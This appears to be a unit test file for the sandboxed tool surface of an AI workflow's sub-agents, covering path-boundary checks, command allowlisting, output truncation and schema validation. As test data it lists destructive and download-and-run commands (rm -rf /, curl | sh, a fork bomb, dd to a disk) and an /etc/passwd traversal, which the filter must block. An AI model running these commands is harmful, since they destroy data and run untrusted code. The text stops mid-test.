// Workflows T5（#228）：并行子 agent 工具集（只读面）——零件契约
//
// 单元面锁工具面零件各自的行为边界：路径双检（词法 + realpath）、危险命令过滤与
// safe 读命令白名单、返回的有界与显式截断、JSON Schema 子集闸门、工具面可见性与
// 收窄（tools / disallowedTools / agentType / schema 模式的 structured_output）、
// 每路系统提示词的拼接、进程组收集与优雅关机。改了就红。
// 引擎级验收（假模型跑完整路、floor 调用被拒、三次校验失败即该路无结果）在
// issue-228-agent-tools.test.mjs。

import { test, afterEach } from 'bun:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

import { resolveToolPath, ToolBoundaryError, isWithinBoundary } from '../dist/workflows/tool-boundary.js';
import {
  DANGEROUS_COMMAND_PATTERNS,
  SAFE_READ_COMMANDS,
  classifyCommand,
  hasCommandSubstitution,
  interpretExitCode,
  splitCommandChain,
} from '../dist/workflows/tool-command.js';
import {
  MAX_TOOL_RESULT_CHARS,
  MAX_TOOL_TEXT_CHARS,
  TRUNCATION_PREVIEW_CHARS,
  boundText,
  encodeToolResult,
  toolFailure,
  toolOk,
} from '../dist/workflows/tool-output.js';
import { gateJsonSchema, unsupportedSchemaKeywords } from '../dist/workflows/json-gate.js';
import {
  WRITE_ONLY_TOOL_NAMES,
  describeFaceViolations,
  resolveToolFace,
  toolDeclarations,
} from '../dist/workflows/tool-face.js';
import { invokeToolCall } from '../dist/workflows/tool-invoke.js';
import { MAX_LIST_ENTRIES, MAX_SEARCH_FILE_BYTES, globToRegex, walkFiles } from '../dist/workflows/tool-readonly.js';
import {
  DEFAULT_EXECUTE_TIMEOUT_SEC,
  MAX_EXECUTE_TIMEOUT_SEC,
  resetMaxBackgroundOutputBytes,
  setMaxBackgroundOutputBytes,
} from '../dist/workflows/tool-execute.js';
import {
  BACKGROUND_RECORD_TTL_MS,
  collectCommand,
  collectOwnerCommands,
  collectRunCommands,
  getBackgroundRecordTtlMs,
  getCommand,
  isAcceptingCommands,
  listCommands,
  ownerKey,
  pruneCommandRecords,
  resetCommandLedger,
  setBackgroundRecordTtlMs,
  shutdownCommandTrees,
  stopAcceptingCommands,
} from '../dist/workflows/command-tree.js';
import { workflowPaths, runPaths } from '../dist/workflows/paths.js';
import { buildAgentSystemPrompt } from '../dist/workflows/agent-prompt.js';
import {
  DEFAULT_AGENT_ROUNDS,
  MAX_FAILED_STRUCTURED_SUBMISSIONS,
  runAgentPath,
  structuredOutputDeclaration,
} from '../dist/workflows/agent-loop.js';

const TMP = [];
function workspace() {  const dir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'wf-228u-')));
  TMP.push(dir);
  return dir;
}
function dispose() {
  while (TMP.length) {
    const dir = TMP.pop();
    try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* 忽略 */ }
  }
}

/** 每条命令树用例都从零账本起跑：ownerKey 在各用例间是同一个，残味会串。 */
afterEach(() => {
  resetCommandLedger();
});

/** 真套壳：每次多包一层 sh -c，反斜杠与引号都要转义——递归深度的输入用它构造。 */
function nestShell(times, inner) {
  let command = inner;
  for (let index = 0; index < times; index++) {
    command = `sh -c "${command.replace(/\\/g, '\\\\').replace(/"/g, '\\"')}"`;
  }
  return command;
}

/** 轮询等条件成立（固定 tick 的等待在高负载下会假红）。 */
async function until(condition, what, timeoutMs = 5_000) {
  const deadline = Date.now() + timeoutMs;
  for (;;) {
    if (await condition()) return;
    if (Date.now() > deadline) assert.fail(`等不到：${what}`);
    await new Promise((resolve) => setTimeout(resolve, 2));
  }
}

// ═══════════════════════════════════════════════════════════════
// 一、路径双检——词法段与 realpath 段各自成立（AC6）
// ═══════════════════════════════════════════════════════════════

test('边界：相对路径按 cwd 归一，绝对路径原样归一，都落在界内即放行', () => {
  const root = workspace();
  try {
    fs.mkdirSync(path.join(root, 'sub'), { recursive: true });
    assert.equal(resolveToolPath('notes.md', root), path.join(root, 'notes.md'));
    assert.equal(resolveToolPath('sub/notes.md', root), path.join(root, 'sub', 'notes.md'));
    assert.equal(resolveToolPath(path.join(root, 'sub', 'x'), root), path.join(root, 'sub', 'x'));
    assert.equal(resolveToolPath('./a/../b/c.md', root), path.join(root, 'b', 'c.md'), '词法归一后判边界，不按字面串判');
  } finally { dispose(); }
});

test('边界：越界一律拒——上跳、绝对越界、同名前缀兄弟目录三种写法都挡', () => {
  const root = workspace();
  try {
    const sibling = path.join(path.dirname(root), 'sibling');
    for (const bad of ['../etc/passwd', '..', path.join(root, '..', 'out.md'), sibling]) {
      assert.throws(
        () => resolveToolPath(bad, root),
        (error) => error instanceof ToolBoundaryError && /outside the working directory/.test(error.message),
        `${bad} 应拒`,
      );
    }
  } finally { dispose(); }
});

test('边界：symlink 指向界外即拒（词法在界内、realpath 在界外）', { skip: process.platform === 'win32' }, () => {
  const root = workspace();
  try {
    const outside = workspace();
    const target = path.join(outside, 'secret.txt');
    fs.writeFileSync(target, 'leak');
    fs.symlinkSync(outside, path.join(root, 'link'));
    assert.throws(
      () => resolveToolPath('link/secret.txt', root),
      (error) => error instanceof ToolBoundaryError && /symlink/.test(error.message),
      '词法过关不等于过关',
    );
    // 界内 symlink 放行：双检的目的是越界，不是禁 symlink 本身。
    fs.symlinkSync(path.join(root, 'real.txt'), path.join(root, 'alias.txt'));
    fs.writeFileSync(path.join(root, 'real.txt'), 'ok');
    assert.equal(resolveToolPath('alias.txt', root), path.join(root, 'alias.txt'));
  } finally { dispose(); }
});

test('边界：路径尚不存在时 realpath 段退回词法判定（写入新文件是合法动作）', () => {
  const root = workspace();
  try {
    assert.equal(resolveToolPath('new/deep/file.txt', root), path.join(root, 'new', 'deep', 'file.txt'));
    assert.throws(() => resolveToolPath('../new/file.txt', root), ToolBoundaryError, '不存在不等于可以越界');
  } finally { dispose(); }
});

test('边界：入站形状先过闸——空串、非字符串、含换行的路径都拒在拼接之前', () => {
  const root = workspace();
  try {
    for (const bad of ['', '   ', undefined, null, 42, ['a'], 'a\nb', 'a\rb']) {
      assert.throws(
        () => resolveToolPath(bad, root),
        (error) => error instanceof ToolBoundaryError && /must be a non-empty string without control characters/.test(error.message),
        `${String(bad)} 应拒`,
      );
    }
    assert.equal(new ToolBoundaryError('nope').name, 'ToolBoundaryError', '类型名进错误账');
  } finally { dispose(); }
});

test('边界：isWithinBoundary 用分隔符对齐的前缀比较，不做字符串包含', () => {
  const root = workspace();
  try {
    assert.equal(isWithinBoundary(path.join(root, 'a'), root), true);
    assert.equal(isWithinBoundary(root, root), true, '根自身在界内');
    assert.equal(isWithinBoundary(`${root}-evil`, root), false, '同名前缀兄弟目录不算界内');
    assert.equal(isWithinBoundary(path.dirname(root), root), false);
  } finally { dispose(); }
});

// ═══════════════════════════════════════════════════════════════
// 二、命令面——链切分、替换检测、危险过滤、safe 读白名单（AC1）
// ═══════════════════════════════════════════════════════════════

test('命令面：链按 && || ; | 换行切分，引号与转义内的分隔符不算', () => {
  assert.deepEqual(splitCommandChain('ls && grep x file || wc -l < file'), ['ls', 'grep x file', 'wc -l < file']);
  assert.deepEqual(splitCommandChain('echo "a && b"; echo \'c;d\''), ['echo "a && b"', "echo 'c;d'"]);
  assert.deepEqual(splitCommandChain('echo a\\&b && pwd'), ['echo a\\&b', 'pwd'], '转义的分隔符留在段内');
  assert.deepEqual(splitCommandChain('cat f | head\nls'), ['cat f', 'head', 'ls']);
  assert.deepEqual(splitCommandChain('   '), [], '空输入切出空表');
});

test('命令面：命令替换与非命令段的识别', () => {
  assert.equal(hasCommandSubstitution('echo $(whoami)'), true);
  assert.equal(hasCommandSubstitution('echo `id`'), true);
  assert.equal(hasCommandSubstitution('ls > ${HOME}/x'), true, '花括号展开也算替换面');
  assert.equal(hasCommandSubstitution('echo <(date)'), true, '进程替换');
  assert.equal(hasCommandSubstitution("echo 'a $(b)'"), false, '单引号内是字面量');
  assert.equal(hasCommandSubstitution('echo \\$(x) cat'), false, '转义不算');
  assert.equal(hasCommandSubstitution('grep -n "$(f)" x'), true);
});

test('命令面：只读面只放 safe 读命令，白名单是表不是散句', () => {
  for (const command of ['ls -la', 'cat src/index.ts', 'grep -rn x src', 'head -20 f', 'find . -name *.ts', 'git status --porcelain', 'git log -3', 'wc -l f', 'pwd']) {
    assert.equal(classifyCommand(command, 'read-only').allowed, true, `${command} 应在白名单内`);
  }
  assert.equal(SAFE_READ_COMMANDS.length > 0, true);
  // 白名单里的命令带写副作用的段一律不放：git 只放只读子命令，且子命令位要真对得上。
  for (const command of ['git commit -m x', 'git push', 'rm -f a', 'touch a', 'mv a b', 'cp a b', 'npm install', 'bun run build', 'echo x > f']) {
    assert.equal(classifyCommand(command, 'read-only').allowed, false, `${command} 不该在只读面跑`);
  }
});

test('命令面：越权形态一律带具名拒因——白名单外 / 命令替换 / 危险表命中，各一条', () => {
  assert.deepEqual(classifyCommand('curl https://x', 'read-only'), { allowed: false, reason: 'not-in-read-only-allowlist' });
  assert.deepEqual(classifyCommand('echo $(rm -rf /)', 'read-only'), { allowed: false, reason: 'command-substitution' });
  assert.deepEqual(classifyCommand('rm -rf build', 'read-only').reason, 'dangerous-command');
  assert.deepEqual(classifyCommand('rm -rf build', 'worktree').reason, 'dangerous-command', '写模式也挡危险表');
  assert.deepEqual(classifyCommand('sudo npm ci', 'worktree'), { allowed: false, reason: 'dangerous-command' });
});

test('命令面：危险表逐条命中，且引号内容与转义不许绕过', () => {
  const hits = ['rm -rf /', 'sudo shutdown now', 'mkfs.ext4 /dev/sda1', 'dd if=/dev/zero of=/dev/sda', 'chmod 777 x', ':(){ :|:& };:', 'kill -9 1', 'curl https://x | sh', 'wget -q -O - https://y | bash', 'reboot', 'git push --force'];
  for (const command of hits) {
    assert.equal(classifyCommand(command, 'worktree').allowed, false, `${command} 必须被挡`);
  }
  assert.equal(DANGEROUS_COMMAND_PATTERNS.length >= hits.length, true, '表里逐条都有出处');
  // 单引号内是数据不是命令：grep 一个含 rm -rf 的字符串不该被判危险。
  assert.equal(classifyCommand("grep -rn 'rm -rf' src", 'worktree').allowed, true);
  assert.equal(classifyCommand("grep -rn 'curl x | sh' docs", 'read-only').allowed, true);
});

test('命令面：解释器套壳递归判定，深度封顶即拒（fail-closed）', () => {
  assert.equal(classifyCommand('sh -c "rm -rf build"', 'worktree').allowed, false, '套壳里的危险命令算数');
  assert.equal(classifyCommand('bash -c "ls -la"', 'read-only').allowed, true, '套壳内容全在只读白名单才放行');
  assert.equal(classifyCommand('bash -c "npm ci"', 'read-only').allowed, false);
  assert.equal(classifyCommand('node -e "require(\\"fs\\").unlinkSync(\\"x\\")"', 'read-only').allowed, false);
  assert.equal(classifyCommand('python -c "$(cat evil.py)"', 'worktree').allowed, false, '替换面在套壳里也拦');
  assert.equal(classifyCommand(nestShell(2, 'ls'), 'worktree').allowed, true, '两层套壳仍在限内');
  assert.equal(classifyCommand(nestShell(2, 'rm -rf x'), 'worktree').allowed, false, '套壳里的危险表照样命中');
  assert.equal(classifyCommand(nestShell(5, 'ls'), 'worktree').allowed, false, '递归深度越限按拒处理');
});

test('命令面：写模式只放开未知命令，不放开危险表', () => {
  assert.equal(classifyCommand('my-tool --flag', 'read-only').allowed, false);
  assert.equal(classifyCommand('my-tool --flag', 'worktree').allowed, true);
  assert.equal(classifyCommand('python make.py', 'worktree').allowed, true);
  assert.equal(classifyCommand('make && make install', 'worktree').allowed, true);
});

test('命令面：退出码语义——无匹配 / 条件为假 / 文件有差异都不是错误，其余非零才是', () => {
  assert.deepEqual(interpretExitCode('grep x f', 0), { isError: false });
  assert.deepEqual(interpretExitCode('grep x f', 1), { isError: false, message: 'No matches found' });
  assert.deepEqual(interpretExitCode('rg x f', 2), { isError: true, message: 'search tool error (exit code 2)' });
  assert.deepEqual(interpretExitCode('test -f x', 1), { isError: false, message: 'Condition evaluated to false' });
  assert.deepEqual(interpretExitCode('test -f x', 2), { isError: true, message: 'Syntax error in test expression' });
  assert.deepEqual(interpretExitCode('diff a b', 1), { isError: false, message: 'Files differ' });
  assert.deepEqual(interpretExitCode('find . -name x', 1), { isError: false, message: 'Some paths were not accessible' });
  assert.deepEqual(interpretExitCode('find . -name x', 2), { isError: true, message: 'find error (exit code 2)' });
  assert.deepEqual(interpretExitCode('ls', 3), { isError: true, message: 'Command exited with code 3' });
  assert.deepEqual(interpretExitCode('ls', null), { isError: true, message: 'Command was terminated before it exited' });
});

// ═══════════════════════════════════════════════════════════════
// 三、返回面——结构化 JSON + 有界 + 显式截断 + 显式错误（AC5）
// ═══════════════════════════════════════════════════════════════

test('返回面：字节上限照仓库既有文件工具口径，字段级上限给信封留余量', () => {
  assert.equal(MAX_TOOL_RESULT_CHARS, 50_000);
  assert.equal(TRUNCATION_PREVIEW_CHARS, 2_000);
  assert.equal(MAX_TOOL_TEXT_CHARS, MAX_TOOL_RESULT_CHARS - 512);
});

test('返回面：截断只切到上限，代理对不切半，标记与计数都在字段里', () => {
  const short = boundText('abc');
  assert.deepEqual(short, { text: 'abc', truncated: false, chars: 3, shown: 3 });
  const long = boundText('x'.repeat(60_000));
  assert.equal(long.truncated, true);
  assert.equal(long.chars, 60_000);
  assert.equal(long.shown, MAX_TOOL_TEXT_CHARS);
  assert.equal(long.text.length, MAX_TOOL_TEXT_CHARS);
  // 代理对（emoji）落在边界上时整对退出，不留半个码元。
  const pair = 'a'.repeat(MAX_TOOL_TEXT_CHARS - 1) + '🙂';
  const cut = boundText(pair);
  assert.equal(cut.text.endsWith('\uD83D'), false, '不以孤立高位代理结尾');
  assert.equal(cut.truncated, true);
  const explicit = boundText('🙂🙂', 3);
  assert.equal(explicit.text, '🙂', '显式上限同样不切半');
});

test('返回面：成功载荷是带 ok 字段的 JSON；整包过界时压最大的文本字段并留下计数', () => {
  const encoded = encodeToolResult(toolOk({ files: 'a\nb', count: 2 }));
  assert.equal(encoded.isError, false);
  assert.deepEqual(JSON.parse(encoded.content), { ok: true, files: 'a\nb', count: 2 }, '未过界即原样出');
  const big = encodeToolResult(toolOk({ entries: 'y'.repeat(80_000), notes: 'keep' }));
  assert.equal(big.content.length <= MAX_TOOL_RESULT_CHARS, true, '编码后的 JSON 恒在上限内');
  const parsed = JSON.parse(big.content);
  assert.equal(parsed.ok, true);
  assert.equal(parsed.truncated, true, '有截断必有字段');
  assert.equal(parsed.entriesChars, 80_000);
  assert.equal(parsed.entriesShown, TRUNCATION_PREVIEW_CHARS);
  assert.equal(parsed.entries.length, TRUNCATION_PREVIEW_CHARS);
  assert.equal(parsed.notes, 'keep', '只压最大的那个字段，其余不动');
});

test('返回面：碎字段太多压不动时不切 JSON，改出一条具名失败（绝不自相矛盾）', () => {
  const many = {};
  for (let index = 0; index < 400; index++) many[`row${index}`] = 'x'.repeat(1_000);
  const encoded = encodeToolResult(toolOk(many));
  assert.equal(encoded.isError, true);
  const parsed = JSON.parse(encoded.content);
  assert.equal(parsed.ok, false);
  assert.equal(parsed.reason, 'result-too-large');
  assert.equal(encoded.content.length <= MAX_TOOL_RESULT_CHARS, true);
});

test('返回面：错误一律显式字段——error + reason，绝不静默降级成空结果', () => {
  const encoded = encodeToolResult(toolFailure('File not found: "a.txt".', 'not-found'));
  assert.equal(encoded.isError, true);
  assert.deepEqual(JSON.parse(encoded.content), { ok: false, error: 'File not found: "a.txt".', reason: 'not-found' });
  assert.throws(() => toolFailure('', 'x'), /error message must be non-empty/, '空错误文案即形状错');
  assert.throws(() => toolFailure('boom', ''), /reason must be non-empty/, '无名的失败即形状错');
});

test('返回面：空文本是正当结果，走 ok 不走 error，也不添计数字段', () => {
  const encoded = encodeToolResult(toolOk({ text: '' }));
  assert.equal(encoded.isError, false);
  assert.deepEqual(JSON.parse(encoded.content), { ok: true, text: '' });
});

// ═══════════════════════════════════════════════════════════════
// 四、JSON Schema 子集闸门——工具入参与结构化提交共用（AC3）
// ═══════════════════════════════════════════════════════════════

test('闸门：类型 / 必填 / 枚举 / 长度 / 区间 / 正则，逐条给可定位的违例', () => {
  assert.deepEqual(gateJsonSchema('x', { type: 'string' }), []);
  assert.deepEqual(gateJsonSchema(1, { type: 'string' }), [{ path: '(root)', message: 'expected type string, got number' }]);
  assert.deepEqual(gateJsonSchema({}, { type: 'object', required: ['a'] }), [{ path: '(root)', message: 'missing required property "a"' }]);
  assert.deepEqual(gateJsonSchema('a', { type: 'string', minLength: 2 }), [{ path: '(root)', message: 'string shorter than minLength 2' }]);
  assert.deepEqual(gateJsonSchema('abc', { type: 'string', maxLength: 2 }), [{ path: '(root)', message: 'string longer than maxLength 2' }]);
  assert.deepEqual(gateJsonSchema(1, { type: 'integer' }), []);
  assert.deepEqual(gateJsonSchema(1.5, { type: 'integer' }), [{ path: '(root)', message: 'expected type integer, got number' }]);
  assert.deepEqual(gateJsonSchema(0, { type: 'number', minimum: 1 }), [{ path: '(root)', message: 'number below minimum 1' }]);
  assert.deepEqual(gateJsonSchema(9, { type: 'number', maximum: 8 }), [{ path: '(root)', message: 'number above maximum 8' }]);
  assert.deepEqual(gateJsonSchema('z', { enum: ['a', 'b'] }), [{ path: '(root)', message: 'value not in enum' }]);
  assert.deepEqual(gateJsonSchema('ab', { type: 'string', pattern: '^[a-z]+$' }), []);
  assert.deepEqual(gateJsonSchema('a1', { type: 'string', pattern: '^[a-z]+$' }), [{ path: '(root)', message: 'string does not match pattern' }]);
});

test('闸门：对象与数组递归下钻，违例带路径', () => {
  const schema = {
    type: 'object',
    properties: {
      items: { type: 'array', items: { type: 'object', properties: { n: { type: 'number' } }, required: ['n'] } },
      label: { type: 'string' },
    },
    required: ['items'],
    additionalProperties: false,
  };
  assert.deepEqual(gateJsonSchema({ items: [{ n: 1 }] }, schema), []);
  assert.deepEqual(gateJsonSchema({ items: [{ n: 'x' }] }, schema), [{ path: 'items[0].n', message: 'expected type number, got string' }]);
  assert.deepEqual(gateJsonSchema({ items: [{}] }, schema), [{ path: 'items[0]', message: 'missing required property "n"' }]);
  assert.deepEqual(gateJsonSchema({ items: [], extra: 1 }, schema), [{ path: '(root)', message: 'unexpected property "extra"' }]);
  assert.deepEqual(gateJsonSchema({ items: 'no' }, schema), [{ path: 'items', message: 'expected type array, got string' }]);
});

test('闸门：可空类型与联合类型按并集判，非法 schema 形状即闸错', () => {
  assert.deepEqual(gateJsonSchema(null, { type: ['null', 'string'] }), []);
  assert.deepEqual(gateJsonSchema('a', { type: ['null', 'string'] }), []);
  assert.deepEqual(gateJsonSchema(3, { type: ['null', 'string'] }), [{ path: '(root)', message: 'value matches none of the allowed types' }]);
  assert.deepEqual(gateJsonSchema(undefined, { type: 'string' }), [{ path: '(root)', message: 'expected type string, got undefined' }]);
  assert.throws(() => gateJsonSchema('a', 'nope'), /schema must be a JSON object/, 'schema 本身形状不合法即抛，不返回空违例');
  assert.deepEqual(gateJsonSchema('a', {}), [], '空 schema = 不设限');
});

test('闸门：不认识的关键词点名报出，不静默当成通过', () => {
  assert.deepEqual(unsupportedSchemaKeywords({ type: 'string', format: 'date-time', minProperties: 2 }), ['format', 'minProperties']);
  assert.deepEqual(unsupportedSchemaKeywords({ type: 'object', properties: { a: { type: 'string' } }, required: ['a'] }), []);
  assert.deepEqual(unsupportedSchemaKeywords({ type: 'object', properties: { a: { anyOf: [{ type: 'string' }] } } }), ['anyOf']);
});

// ═══════════════════════════════════════════════════════════════
// 五、工具面——floor 禁令、模式可见性、只减不增的收窄（AC1 / AC2）
// ═══════════════════════════════════════════════════════════════

test('工具面：模块可执行面齐备且都在 floor 名单里，没有任何写工具', () => {
  const face = resolveToolFace({ mode: 'read-only' });
  assert.deepEqual(face.names, ['read_file', 'read_file_range', 'list_dir', 'find_files', 'search_text', 'execute_cli']);
  assert.deepEqual(WRITE_ONLY_TOOL_NAMES, ['write_file', 'apply_patch'], '写面两条随隔离票交付');
  for (const name of face.names) assert.equal(WRITE_ONLY_TOOL_NAMES.includes(name), false, `${name} 不许出现在只读面`);
  assert.equal(describeFaceViolations(face.names, 'read-only').length, 0, '默认面无结构性违例');
});

test('工具面：floor 禁令逐类点名——扇出 / 消息 / 控制面 / task_* 都判违规', () => {
  const banned = ['workflow_start', 'workflow_cancel', 'subagent_start', 'wait_for_path', 'message_send', 'message_inbox', 'session_checkpoint', 'ask_user_question', 'enter_plan_mode', 'skill', 'task_create', 'task_update', 'task_list'];
  for (const name of banned) {
    assert.equal(describeFaceViolations([name], 'worktree').length > 0, true, `${name} 必须被 floor 判违规`);
  }
  // task_ 前缀整族禁用，不止列出的那几个。
  assert.equal(describeFaceViolations(['task_something'], 'worktree').length > 0, true);
  // 模块不发的名字同样违规（面只能由这张表组出来）。
  assert.equal(describeFaceViolations(['read_and_write_file'], 'worktree').length > 0, true, '复合工具即违规');
  assert.equal(describeFaceViolations(['unknown_tool'], 'worktree').length > 0, true, '没登记的名字即违规');
});

test('工具面：tools 只能收窄，不能解禁——空交集与面外名字都在烧 token 前拒', () => {
  const narrow = resolveToolFace({ mode: 'read-only', tools: ['read_file', 'Read file'] });
  assert.deepEqual(narrow.names, ['read_file'], '展示名与拼写名互认，去重后按面序出');
  const writeRequest = resolveToolFace({ mode: 'read-only', tools: ['write_file'] });
  assert.equal(writeRequest.refusal.reason, 'tool-unavailable-on-face', '只读面请求写工具即拒');
  assert.match(writeRequest.refusal.message, /mode: read-only/);
  const empty = resolveToolFace({ mode: 'read-only', disallowedTools: ['read_file', 'read_file_range', 'list_dir', 'find_files', 'search_text', 'execute_cli'] });
  assert.equal(empty.refusal.reason, 'tools-narrowed-to-empty');
  const unknownType = resolveToolFace({ mode: 'read-only', agentType: 'researcher' });
  assert.equal(unknownType.refusal.reason, 'unknown-agent-type');
  assert.match(unknownType.refusal.message, /workflow-agent/);
});

test('工具面：agentType 给上界——reader 形态没有执行面，floor 也不因它放宽', () => {
  const reader = resolveToolFace({ mode: 'read-only', agentType: 'reader' });
  assert.deepEqual(reader.names, ['read_file', 'read_file_range', 'list_dir', 'find_files', 'search_text']);
  const askedForExec = resolveToolFace({ mode: 'read-only', agentType: 'reader', tools: ['execute_cli'] });
  assert.equal(askedForExec.refusal.reason, 'tool-unavailable-on-face', '形态上界不可被 tools 抬');
});

test('工具面：schema 模式自动补 structured_output，且它不在可减之列', () => {
  const schema = resolveToolFace({ mode: 'read-only', schema: true });
  assert.deepEqual(schema.names.slice(-1), ['structured_output'], '出口排最后');
  const denied = resolveToolFace({ mode: 'read-only', schema: true, disallowedTools: ['structured_output', 'read_file'] });
  assert.deepEqual(denied.names, ['read_file_range', 'list_dir', 'find_files', 'search_text', 'execute_cli', 'structured_output']);
  const plain = resolveToolFace({ mode: 'read-only' });
  assert.equal(plain.names.includes('structured_output'), false, '非 schema 模式不给出口');
});

test('工具面：递给模型的声明只有名字 / 描述 / 入参形状，且不含出口（出口由循环补）', () => {
  const declarations = toolDeclarations(['read_file', 'execute_cli', 'structured_output']);
  assert.deepEqual(declarations.map((tool) => tool.name), ['read_file', 'execute_cli']);
  for (const declaration of declarations) {
    assert.deepEqual(Object.keys(declaration).sort(), ['description', 'input_schema', 'name']);
    assert.equal(typeof declaration.description, 'string');
    assert.equal(declaration.input_schema.type, 'object');
    assert.equal(declaration.input_schema.additionalProperties, false, '入参不收意外键');
  }
});

// ═══════════════════════════════════════════════════════════════
// 六、只读工具实测——真文件、真目录、真截断、真拒因（AC1 / AC5 / AC6）
// ═══════════════════════════════════════════════════════════════

function contextFor(root, options = {}) {
  const paths = workflowPaths(path.join(root, '.myterminal'));
  const run = runPaths(paths, 'wf_0000000000000001');
  const controller = new AbortController();
  const context = {
    runId: 'wf_0000000000000001',
    dispatchId: 'd0001',
    label: 'unit',
    cwd: root,
    mode: options.mode ?? 'read-only',
    signal: controller.signal,
    run,
    ...(options.schema ? { schema: options.schema } : {}),
  };
  return { context, controller, run };
}

async function call(name, input, root, options = {}) {
  const { context } = contextFor(root, options);
  return run(name, input, context);
}

/** 直接拿上下文调工具：中止 / 后台这类用例要自己持有 controller。 */
async function run(name, input, context) {
  const face = resolveToolFace({ mode: context.mode, schema: context.schema !== undefined });
  const result = await invokeToolCall({ id: 't1', name, input }, { names: face.names, mode: context.mode }, context);
  return { ...result, payload: JSON.parse(result.content) };
}

test('只读工具：read_file 给全文与三个读数，目录与二进制各有一条具名失败', async () => {
  const root = workspace();
  try {
    fs.writeFileSync(path.join(root, 'a.txt'), 'line1\nline2');
    fs.writeFileSync(path.join(root, 'x.png'), 'not really a png');
    fs.mkdirSync(path.join(root, 'd'));
    assert.deepEqual((await call('read_file', { path: 'a.txt' }, root)).payload, { ok: true, text: 'line1\nline2', truncated: false, chars: 11, shown: 11, totalLines: 2 });
    assert.equal((await call('read_file', { path: 'd' }, root)).payload.reason, 'is-directory');
    assert.equal((await call('read_file', { path: 'x.png' }, root)).payload.reason, 'binary-file');
    assert.equal((await call('read_file', { path: 'nope.txt' }, root)).payload.reason, 'not-found');
    assert.equal((await call('read_file', { path: '../../etc/passwd' }, root)).payload.reason, 'outside-boundary');
    assert.equal((await call('read_file', {}, root)).payload.reason, 'bad-tool-input');
    assert.equal((await call('read_file', { path: 'a.txt', extra: 1 }, root)).payload.reason, 'bad-tool-input', '意外键即形状错');
    assert.equal((await call('read_file', 'not-an-object', root)).payload.reason, 'bad-tool-input');
  } finally { dispose(); }
});

test('只读工具：read_file 的截断是显式的——上限之内原样、过界给计数', async () => {
  const root = workspace();
  try {
    fs.writeFileSync(path.join(root, 'big.txt'), 'z'.repeat(MAX_TOOL_RESULT_CHARS + 5_000));
    const payload = (await call('read_file', { path: 'big.txt' }, root)).payload;
    assert.equal(payload.truncated, true);
    assert.equal(payload.chars, MAX_TOOL_RESULT_CHARS + 5_000);
    assert.equal(payload.shown, MAX_TOOL_TEXT_CHARS);
    assert.equal(payload.text.length, MAX_TOOL_TEXT_CHARS);
  } finally { dispose(); }
});

test('只读工具：read_file_range 带 1 基行号、翻页读数与 hasMore，行段参数不合即拒', async () => {
  const root = workspace();
  try {
    fs.writeFileSync(path.join(root, 'n.txt'), [0, 1, 2, 3, 4].map((i) => `l${i}`).join('\n'));
    const page = (await call('read_file_range', { path: 'n.txt', firstLine: 2, lineCount: 2 }, root)).payload;
    assert.equal(page.text, '2\tl1\n3\tl2');
    assert.deepEqual({ total: page.totalLines, first: page.firstLine, last: page.lastLine, more: page.hasMore }, { total: 5, first: 2, last: 3, more: true });
    const tail = (await call('read_file_range', { path: 'n.txt', firstLine: 5, lineCount: 10 }, root)).payload;
    assert.equal(tail.hasMore, false);
    assert.equal((await call('read_file_range', { path: 'n.txt', firstLine: 0 }, root)).payload.reason, 'bad-line-range');
    assert.equal((await call('read_file_range', { path: 'n.txt', lineCount: -2 }, root)).payload.reason, 'bad-line-range');
    assert.equal((await call('read_file_range', { path: 'n.txt', lineCount: 1.5 }, root)).payload.reason, 'bad-tool-input', '非整数先过入参形状闸');
  } finally { dispose(); }
});

test('只读工具：list_dir 一层、目录带斜杠、按名排序且有条数帽', async () => {
  const root = workspace();
  try {
    fs.mkdirSync(path.join(root, 'sub'));
    fs.writeFileSync(path.join(root, 'b.txt'), '12');
    fs.writeFileSync(path.join(root, 'a.txt'), '1');
    const payload = (await call('list_dir', {}, root)).payload;
    assert.equal(payload.entries, 'a.txt (1 bytes)\nb.txt (2 bytes)\nsub/');
    assert.equal(payload.entryCount, 3);
    assert.equal(payload.truncated, false);
    assert.equal(payload.limit, MAX_LIST_ENTRIES);
    assert.equal((await call('list_dir', { path: 'missing' }, root)).payload.reason, 'not-found');
    assert.equal((await call('list_dir', { path: 'a.txt' }, root)).payload.reason, 'not-a-directory');
  } finally { dispose(); }
});

test('只读工具：find_files 按 glob 出相对路径，帽到条数并显式标 truncated', async () => {
  const root = workspace();
  try {
    fs.mkdirSync(path.join(root, 'src', 'deep'), { recursive: true });
    fs.writeFileSync(path.join(root, 'src', 'a.ts'), '');
    fs.writeFileSync(path.join(root, 'src', 'deep', 'b.ts'), '');
    fs.writeFileSync(path.join(root, 'note.md'), '');
    fs.mkdirSync(path.join(root, 'node_modules'), { recursive: true });
    fs.writeFileSync(path.join(root, 'node_modules', 'skip.ts'), '');
    const all = (await call('find_files', { pattern: '**/*.ts' }, root)).payload;
    assert.deepEqual(all.files.split('\n'), ['src/a.ts', 'src/deep/b.ts'], '被忽略目录不进结果');
    const flat = (await call('find_files', { pattern: '*.ts' }, root)).payload;
    assert.equal(flat.matchCount, 0);
    assert.equal((await call('find_files', { pattern: '' }, root)).payload.reason, 'bad-pattern');
    for (let index = 0; index < MAX_LIST_ENTRIES + 5; index++) fs.writeFileSync(path.join(root, `f${String(index).padStart(4, '0')}.txt`), '');
    const capped = (await call('find_files', { pattern: '*.txt' }, root)).payload;
    assert.equal(capped.truncated, true);
    assert.equal(capped.matchCount, MAX_LIST_ENTRIES + 5);
    assert.equal(capped.files.split('\n').length, MAX_LIST_ENTRIES);
  } finally { dispose(); }
});

test('只读工具：search_text 出 file:line:text，非法正则与帽都有具名结果', async () => {
  const root = workspace();
  try {
    fs.mkdirSync(path.join(root, 'src'), { recursive: true });
    fs.writeFileSync(path.join(root, 'src', 'a.ts'), 'one\nneedle here\nthree');
    fs.writeFileSync(path.join(root, 'src', 'b.ts'), 'needle too but on a very long line that should be capped '.repeat(20));
    const hit = (await call('search_text', { pattern: 'needle' }, root)).payload;
    assert.match(hit.text, /^src\/a\.ts:2:needle here$/m);
    assert.equal(hit.matchCount, 2);
    for (const row of hit.text.split('\n')) assert.equal(row.length <= 520, true, '单条命中行被钳到 500 字符（加 file:line 前缀）');
    assert.equal((await call('search_text', { pattern: '(' }, root)).payload.reason, 'bad-regex');
    assert.equal((await call('search_text', { pattern: 'needle', glob: '**/*.ts' }, root)).payload.matchCount, 2, 'glob 限定文件名形态');
